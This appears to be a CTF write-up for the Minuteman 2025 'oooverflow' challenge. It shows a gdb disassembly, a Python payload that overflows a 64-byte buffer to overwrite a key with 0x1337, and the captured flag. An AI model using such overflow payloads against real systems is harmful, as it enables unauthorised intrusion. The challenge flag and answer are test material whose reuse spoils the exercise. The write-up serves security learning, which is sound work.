---
name: minuteman-2025-oooverflow-1
title: minuteman ctf 2025 - oooverflow-1
number: 04
subtitle: writeup for a stack-based buffer overflow
date: 10/20/25
---
# Minuteman CTF 2025 Oooverflow-2
## Problem Overview
The intended flow of the program is that the program will prompt the user to solve a riddle, copy the inputted answer into the buffer, then check a stored key with the value 0x1234 against 0x1337, and if they match, call the `win()` function and print out the flag.

Since 0x1234 notably doesn't equal 0x1337, we will have to change that or otherwise be able to call the win function.
## The Vulnerability
Given that this challenge is marked as a buffer overflow (and named oooverflow), a buffer overflow vulnerability seems likely. Looking at the given C code, we can see that there is no length checking on the input, however, `fgets` will only copy the first 0x64 bytes from standard input into the answer buffer, which has a size of 64 - not 0x64! So, the program reads more than it allocates for, so we can use that extra input space to change the key!
## Solution
The first step is to figure how how much we need to overflow by. Looking at the disassembly of the C code in gdb we see this:
```x86asm
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000402f7e <+0>:     push   rbp
   0x0000000000402f7f <+1>:     mov    rbp,rsp
   0x0000000000402f82 <+4>:     sub    rsp,0x50
   0x0000000000402f86 <+8>:     mov    WORD PTR [rbp-0x2],0x1234
   0x0000000000402f8c <+14>:    lea    rax,[rip+0x7c08d]        # 0x47f020
   0x0000000000402f93 <+21>:    mov    rdi,rax
   0x0000000000402f96 <+24>:    mov    eax,0x0
   0x0000000000402f9b <+29>:    call   0x406610 <printf>
   0x0000000000402fa0 <+34>:    mov    rdx,QWORD PTR [rip+0xb4711]        # 0x4b76b8 <stdin>
   0x0000000000402fa7 <+41>:    lea    rax,[rbp-0x50]
   0x0000000000402fab <+45>:    mov    esi,0x64
   0x0000000000402fb0 <+50>:    mov    rdi,rax
   0x0000000000402fb3 <+53>:    call   0x40c7f0 <fgets>
   0x0000000000402fb8 <+58>:    movzx  eax,WORD PTR [rbp-0x2]
   0x0000000000402fbc <+62>:    lea    rdx,[rip+0x7c097]        # 0x47f05a
   0x0000000000402fc3 <+69>:    mov    esi,eax
   0x0000000000402fc5 <+71>:    mov    rdi,rdx
   0x0000000000402fc8 <+74>:    mov    eax,0x0
   0x0000000000402fcd <+79>:    call   0x406610 <printf>
   0x0000000000402fd2 <+84>:    cmp    WORD PTR [rbp-0x2],0x1337
   0x0000000000402fd8 <+90>:    jne    0x402ff5 <main+119>
   0x0000000000402fda <+92>:    lea    rax,[rip+0x7c086]        # 0x47f067
   0x0000000000402fe1 <+99>:    mov    rdi,rax
   0x0000000000402fe4 <+102>:   mov    eax,0x0
   0x0000000000402fe9 <+107>:   call   0x406610 <printf>
   0x0000000000402fee <+112>:   call   0x402f68 <win>
   0x0000000000402ff3 <+117>:   jmp    0x403009 <main+139>
   0x0000000000402ff5 <+119>:   lea    rax,[rip+0x7c07c]        # 0x47f078
   0x0000000000402ffc <+126>:   mov    rdi,rax
   0x0000000000402fff <+129>:   mov    eax,0x0
   0x0000000000403004 <+134>:   call   0x406610 <printf>
   0x0000000000403009 <+139>:   mov    eax,0x0
   0x000000000040300e <+144>:   leave
   0x000000000040300f <+145>:   ret
End of assembler dump.
```
At offset \<+4>, we are told that 0x50 bytes are allocated for the stack. Offset \<+8> tells us that our flag takes up the 2 bytes directly below rbp. If we then make our input some junk for 0x4e (0x50 - 0x2) bytes followed by our key 0x1337, we should be able to change the existing key's value and call the `win()` function.

```python
import struct
import sys

payload = b'A'*(0x50 - 0x2) + struct.pack("<Q", 0x1337)

sys.stdout.buffer.write(payload)
```

Aaaand....
```
-> python3 ./sol.py | nc pwn.minuteman.umasscybersec.org 19467
Tell me, voyager, what is simple, and yet also a riddle: key = 0x1337
That's it!MINUTEMAN{m4n_th4t_m1ddl3_5ucks_6615cf64314a6}
```
ta-da!